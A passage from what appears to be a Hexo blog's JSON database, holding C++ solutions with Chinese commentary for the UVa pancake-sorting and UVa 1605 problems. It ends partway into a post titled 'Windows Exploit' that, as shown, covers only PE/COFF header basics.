(!check(i))</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tpos = getpos(a[i]);</div><div class=\"line\">\t\t\t\t_swap(<span class=\"number\">1</span>, pos);</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, cur - pos);</div><div class=\"line\">\t\t\t\t_swap(<span class=\"number\">1</span>, i);</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, cur - i);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"0\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h3 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h3><blockquote>\n<p>Stacks and Queues are often considered the bread and butter of data structures and find use in architecture,<br>parsing, operating systems, and discrete event simulation. Stacks are also important in the<br>theory of formal languages.<br>This problem involves both butter and sustenance in the form of pancakes rather than bread in<br>addition to a finicky server who flips pancakes according to a unique, but complete set of rules.<br>Given a stack of pancakes, you are to write a program that indicates how the stack can be sorted<br>so that the largest pancake is on the bottom and the smallest pancake is on the top. The size of a<br>pancake is given by the pancake’s diameter. All pancakes in a stack have different diameters.<br>Sorting a stack is done by a sequence of pancake “flips”. A flip consists of inserting a spatula<br>between two pancakes in a stack and flipping (reversing) all the pancakes on the spatula (reversing the<br>sub-stack). A flip is specified by giving the position of the pancake on the bottom of the sub-stack to<br>be flipped (relative to the whole stack). The pancake on the bottom of the whole stack has position 1<br>and the pancake on the top of a stack of n pancakes has position n.<br>A stack is specified by giving the diameter of each pancake in the stack in the order in which the<br>pancakes appear.<br>For example, consider the three stacks of pancakes below (in which pancake 8 is the top-most<br>pancake of the left stack):<br>8 7 2<br>4 6 5<br>6 4 8<br>7 8 4<br>5 5 6<br>2 2 7<br>The stack on the left can be transformed to the stack in the middle via flip(3). The middle stack can<br>be transformed into the right stack via the command flip(1).<br>Input<br>The input consists of a sequence of stacks of pancakes. Each stack will consist of between 1 and 30<br>pancakes and each pancake will have an integer diameter between 1 and 100. The input is terminated<br>by end-of-file. Each stack is given as a single line of input with the top pancake on a stack appearing<br>first on a line, the bottom pancake appearing last, and all pancakes separated by a space.<br>Output<br>For each stack of pancakes, the output should echo the original stack on one line, followed by some<br>sequence of flips that results in the stack of pancakes being sorted so that the largest diameter pancake<br>is on the bottom and the smallest on top. For each stack the sequence of flips should be terminated by<br>a ‘0’ (indicating no more flips necessary). Once a stack is sorted, no more flips should be made.<br>Sample Input<br>1 2 3 4 5<br>5 4 3 2 1<br>5 1 2 3 4<br>Sample Output<br>1 2 3 4 5<br>0<br>5 4 3 2 1<br>1 0<br>5 1 2 3 4<br>1 2 0</p>\n</blockquote>\n<p>改来改去终于对了，还有很长的路要走啊，最近天天做梦梦到考研，仿佛是看到了浙大一样，为什么会这么强烈呢，大概还是后悔高中最后的那段日子吧。不过那是那时我的选择，无论怎样，都是不可复制的人生。</p>\n<h3 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> p[<span class=\"number\">101</span>];</div><div class=\"line\"><span class=\"keyword\">int</span> a[<span class=\"number\">101</span>];</div><div class=\"line\"><span class=\"keyword\">char</span> x;</div><div class=\"line\"><span class=\"keyword\">int</span> y;</div><div class=\"line\"><span class=\"keyword\">int</span> pos;</div><div class=\"line\"><span class=\"keyword\">int</span> cur = <span class=\"number\">1</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getpos</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; cur; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (p[i] == n)</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> i;</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">void</span> _swap(<span class=\"keyword\">int</span> begin, <span class=\"keyword\">int</span> end)</div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (; end &gt; begin; end--, begin++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tswap(p[begin], p[end]);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">check</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = n; i &gt; <span class=\"number\">1</span>; i--)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (a[i] != p[i])</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tcur = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">while</span> (<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y))</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tx = getchar();</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (x == EOF)</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\ta[cur] = y;</div><div class=\"line\">\t\t\tp[cur++] = y;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (x == <span class=\"string\">'\\n'</span>)</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; cur; i++)</div><div class=\"line\">\t\t\ti != cur - <span class=\"number\">1</span> ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, p[i]) : <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, p[i]);</div><div class=\"line\">\t\tsort(a + <span class=\"number\">1</span>, a + cur);</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = cur - <span class=\"number\">1</span>; i &gt; <span class=\"number\">1</span>; i--)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!check(i))</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tpos = getpos(a[i]);</div><div class=\"line\">\t\t\t\t_swap(<span class=\"number\">1</span>, pos);</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, cur - pos);</div><div class=\"line\">\t\t\t\t_swap(<span class=\"number\">1</span>, i);</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d \"</span>, cur - i);</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"0\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"UVa 1605","date":"2017-03-20T15:36:35.000Z","_content":"\n## Description\n\n> The United Nations has decided to build a new headquarters in Saint Petersburg, Russia. It will have a\nform of a rectangular parallelepiped and will consist of several rectangular floors, one on top of another.\nEach floor is a rectangular grid of the same dimensions, each cell of this grid is an office.\nTwo offices are considered adjacent if they are located on the same floor and share a common wall,\nor if one’s floor is the other’s ceiling.\nThe St. Petersburg building will host n national missions. Each country gets several offices that\nform a connected set.\nMoreover, modern political situation shows that countries might want to form secret coalitions. For\nthat to be possible, each pair of countries must have at least one pair of adjacent offices, so that they\ncan raise the wall or the ceiling they share to perform secret pair-wise negotiations just in case they\nneed to.\nYou are hired to design an appropriate building for the UN.\nInput\nInput consists of several datasets. Each of them has a single integer number n (1 ≤ n ≤ 50) — the\nnumber of countries that are hosted in the building.\nOutput\nOn the first line of the output for each dataset write three integer numbers h, w, and l — height, width\nand length of the building respectively.\nh descriptions of floors should follow. Each floor description consists of l lines with w characters on\neach line. Separate descriptions of adjacent floors with an empty line.\nUse capital and small Latin letters to denote offices of different countries. There should be at most\n1 000 000 offices in the building. Each office should be occupied by a country. There should be exactly\nn different countries in the building. In this problem the required building design always exists.\nPrint a blank line between test cases.\nSample Input\n4\nSample Output\n2 2 2\nAB\nCC\nzz\nzz\n\n以为是一次输入一个数据，看了别人的才发现并不是。\n紫书上的思路，构造两层，第一层第i行是国家i，第二层第j列是国家j。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n\nusing namespace std;\ntypedef long long LL;\n\nint n;\n\nchar arr[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\";\n\nvoid printl(int n)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = 0; j < n; j++)\n\t\t\tprintf(\"%c\", arr[i]);\n\t\tprintf(\"\\n\");\n\t}\n}\n\nvoid printh(int n)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = 0; j < n; j++)\n\t\t\tprintf(\"%c\", arr[j]);\n\t\tprintf(\"\\n\");\n\t}\n}\n\nint main()\n{\n\twhile (~scanf(\"%d\", &n))\n\t{\n\t\tprintf(\"2 %d %d\\n\", n, n);\n\t\tprintl(n);\n\t\tprintf(\"\\n\");\n\t\tprinth(n);\n\t}\n\treturn 0;\n}\n```","source":"_posts/UVa-1605.md","raw":"---\ntitle: UVa 1605\ntags:\n  - 构造法\n  - UVa\ncategories: []\ndate: 2017-03-20 23:36:35\n---\n\n## Description\n\n> The United Nations has decided to build a new headquarters in Saint Petersburg, Russia. It will have a\nform of a rectangular parallelepiped and will consist of several rectangular floors, one on top of another.\nEach floor is a rectangular grid of the same dimensions, each cell of this grid is an office.\nTwo offices are considered adjacent if they are located on the same floor and share a common wall,\nor if one’s floor is the other’s ceiling.\nThe St. Petersburg building will host n national missions. Each country gets several offices that\nform a connected set.\nMoreover, modern political situation shows that countries might want to form secret coalitions. For\nthat to be possible, each pair of countries must have at least one pair of adjacent offices, so that they\ncan raise the wall or the ceiling they share to perform secret pair-wise negotiations just in case they\nneed to.\nYou are hired to design an appropriate building for the UN.\nInput\nInput consists of several datasets. Each of them has a single integer number n (1 ≤ n ≤ 50) — the\nnumber of countries that are hosted in the building.\nOutput\nOn the first line of the output for each dataset write three integer numbers h, w, and l — height, width\nand length of the building respectively.\nh descriptions of floors should follow. Each floor description consists of l lines with w characters on\neach line. Separate descriptions of adjacent floors with an empty line.\nUse capital and small Latin letters to denote offices of different countries. There should be at most\n1 000 000 offices in the building. Each office should be occupied by a country. There should be exactly\nn different countries in the building. In this problem the required building design always exists.\nPrint a blank line between test cases.\nSample Input\n4\nSample Output\n2 2 2\nAB\nCC\nzz\nzz\n\n以为是一次输入一个数据，看了别人的才发现并不是。\n紫书上的思路，构造两层，第一层第i行是国家i，第二层第j列是国家j。\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<string>\n#include<algorithm>\n\nusing namespace std;\ntypedef long long LL;\n\nint n;\n\nchar arr[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\";\n\nvoid printl(int n)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = 0; j < n; j++)\n\t\t\tprintf(\"%c\", arr[i]);\n\t\tprintf(\"\\n\");\n\t}\n}\n\nvoid printh(int n)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tfor (int j = 0; j < n; j++)\n\t\t\tprintf(\"%c\", arr[j]);\n\t\tprintf(\"\\n\");\n\t}\n}\n\nint main()\n{\n\twhile (~scanf(\"%d\", &n))\n\t{\n\t\tprintf(\"2 %d %d\\n\", n, n);\n\t\tprintl(n);\n\t\tprintf(\"\\n\");\n\t\tprinth(n);\n\t}\n\treturn 0;\n}\n```","slug":"UVa-1605","published":1,"updated":"2017-03-20T15:39:39.738Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k2m003shv18lj65r07w","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>The United Nations has decided to build a new headquarters in Saint Petersburg, Russia. It will have a<br>form of a rectangular parallelepiped and will consist of several rectangular floors, one on top of another.<br>Each floor is a rectangular grid of the same dimensions, each cell of this grid is an office.<br>Two offices are considered adjacent if they are located on the same floor and share a common wall,<br>or if one’s floor is the other’s ceiling.<br>The St. Petersburg building will host n national missions. Each country gets several offices that<br>form a connected set.<br>Moreover, modern political situation shows that countries might want to form secret coalitions. For<br>that to be possible, each pair of countries must have at least one pair of adjacent offices, so that they<br>can raise the wall or the ceiling they share to perform secret pair-wise negotiations just in case they<br>need to.<br>You are hired to design an appropriate building for the UN.<br>Input<br>Input consists of several datasets. Each of them has a single integer number n (1 ≤ n ≤ 50) — the<br>number of countries that are hosted in the building.<br>Output<br>On the first line of the output for each dataset write three integer numbers h, w, and l — height, width<br>and length of the building respectively.<br>h descriptions of floors should follow. Each floor description consists of l lines with w characters on<br>each line. Separate descriptions of adjacent floors with an empty line.<br>Use capital and small Latin letters to denote offices of different countries. There should be at most<br>1 000 000 offices in the building. Each office should be occupied by a country. There should be exactly<br>n different countries in the building. In this problem the required building design always exists.<br>Print a blank line between test cases.<br>Sample Input<br>4<br>Sample Output<br>2 2 2<br>AB<br>CC<br>zz<br>zz</p>\n</blockquote>\n<p>以为是一次输入一个数据，看了别人的才发现并不是。<br>紫书上的思路，构造两层，第一层第i行是国家i，第二层第j列是国家j。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">char</span> arr[] = <span class=\"string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">printl</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%c\"</span>, arr[i]);</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">printh</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%c\"</span>, arr[j]);</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (~<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n))</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"2 %d %d\\n\"</span>, n, n);</div><div class=\"line\">\t\tprintl(n);</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t\tprinth(n);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>The United Nations has decided to build a new headquarters in Saint Petersburg, Russia. It will have a<br>form of a rectangular parallelepiped and will consist of several rectangular floors, one on top of another.<br>Each floor is a rectangular grid of the same dimensions, each cell of this grid is an office.<br>Two offices are considered adjacent if they are located on the same floor and share a common wall,<br>or if one’s floor is the other’s ceiling.<br>The St. Petersburg building will host n national missions. Each country gets several offices that<br>form a connected set.<br>Moreover, modern political situation shows that countries might want to form secret coalitions. For<br>that to be possible, each pair of countries must have at least one pair of adjacent offices, so that they<br>can raise the wall or the ceiling they share to perform secret pair-wise negotiations just in case they<br>need to.<br>You are hired to design an appropriate building for the UN.<br>Input<br>Input consists of several datasets. Each of them has a single integer number n (1 ≤ n ≤ 50) — the<br>number of countries that are hosted in the building.<br>Output<br>On the first line of the output for each dataset write three integer numbers h, w, and l — height, width<br>and length of the building respectively.<br>h descriptions of floors should follow. Each floor description consists of l lines with w characters on<br>each line. Separate descriptions of adjacent floors with an empty line.<br>Use capital and small Latin letters to denote offices of different countries. There should be at most<br>1 000 000 offices in the building. Each office should be occupied by a country. There should be exactly<br>n different countries in the building. In this problem the required building design always exists.<br>Print a blank line between test cases.<br>Sample Input<br>4<br>Sample Output<br>2 2 2<br>AB<br>CC<br>zz<br>zz</p>\n</blockquote>\n<p>以为是一次输入一个数据，看了别人的才发现并不是。<br>紫书上的思路，构造两层，第一层第i行是国家i，第二层第j列是国家j。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">char</span> arr[] = <span class=\"string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">printl</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%c\"</span>, arr[i]);</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">printh</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; n; j++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%c\"</span>, arr[j]);</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (~<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n))</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"2 %d %d\\n\"</span>, n, n);</div><div class=\"line\">\t\tprintl(n);</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t\tprinth(n);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"Windows Exploit","date":"2017-08-15T15:01:45.000Z","_content":"\n## 基础知识\n\n### PE/COFF文件格式\n\n![思维导图](http://images2015.cnblogs.com/blog/928323/201604/928323-20160424150039054-1771063095.png)\n\n#### DOS header\n\n在中有一个MZ signature，事实上这个MZ signature是DOS文件的一个16bit的数字，表示这个DOS文件同样可以运行在MZ系统上（DOS的一个后续版本）\n\n#### PE FILE HEADER\n\n中有一个EntryPoint用来指示文件的入口点，同样的在ELF文件格式中也有这么一个东西来指示入口点。\nDATADirectory在`WINNT.H`中的定义如下\n```\n#define IMAGE_DIRECTORY_ENTRY_EXPORT         0 导出表  \n#define IMAGE_DIRECTORY_ENTRY_IMPORT         1 导入表   \n#define IMAGE_DIRECTORY_ENTRY_RESOURCE       2 资源目录  \n#define IMAGE_DIRECTORY_ENTRY_EXCEPTION      3 异常目录  \n#define IMAGE_DIRECTORY_ENTRY_SECURITY       4 安全目录  \n#define IMAGE_DIRECTORY_ENTRY_BASERELOC          5 重定位基本表  \n#define IMAGE_DIRECTORY_ENTRY_DEBUG      6 调试目录  \n#define IMAGE_DIRECTORY_ENTRY_COPYRIGHT      7 描术字串  \n#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR      8 机器值  \n#define IMAGE_DIRECTORY_ENTRY_TLS        9 TLS目录  \n#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10 载入配值目录  \n#define 